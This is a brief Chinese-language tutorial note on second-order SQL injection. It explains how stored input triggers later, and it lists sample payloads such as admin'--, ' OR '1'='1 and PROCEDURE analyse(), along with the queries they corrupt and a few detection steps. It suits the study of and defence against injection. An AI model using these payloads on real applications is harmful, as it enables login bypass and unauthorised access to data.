# 二阶注入

## 1. 原理

攻击者构造恶意输入，数据被存储后，在第二次调用时触发漏洞

## 2. 利用场景

### 注册功能

```
用户名: admin'--
密码: password

登录时触发注入
```

### 修改密码

```
当前密码: ' OR '1'='1
新密码: attacker
```

### 文件导入

```
CSV文件包含SQL注入
二次解析时触发
```

## 3. 利用示例

### 存储型注入

```sql
-- 注册时
INSERT INTO users (username) VALUES ('admin\'--')

-- 登录时查询变成
SELECT * FROM users WHERE username='admin'--' AND password='...'
```

### 二次 ORDER BY

```sql
-- 存储
' PROCEDURE analyse()--

-- 触发
ORDER BY ${stored_value}
```

## 4. 探测方法

1. 插入特殊字符
2. 检查是否被正确转义
3. 在不同功能点触发
